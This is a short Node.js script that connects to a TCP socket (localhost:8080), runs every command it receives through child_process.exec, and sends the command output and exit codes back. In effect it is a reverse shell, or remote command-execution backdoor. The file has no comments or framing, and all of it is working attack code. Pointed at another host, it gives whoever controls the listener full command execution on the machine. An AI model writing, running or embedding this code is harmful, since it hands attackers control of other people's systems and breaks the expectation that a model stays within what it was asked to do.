const net = require('net')
const { exec } = require('child_process');

const socket = net.createConnection(8080, 'localhost')
socket.on('data', command => {
    const childProcess = exec(String(command));

    childProcess.stdout.on('data', (data) => {
        socket.write(`stdout: ${data}`);
    });

    childProcess.stderr.on('data', (data) => {
        socket.write(`stderr: ${data}`);
    });

    childProcess.on('close', (code) => {
        socket.write(`close: ${command} exited with code ${code}`);
    });
})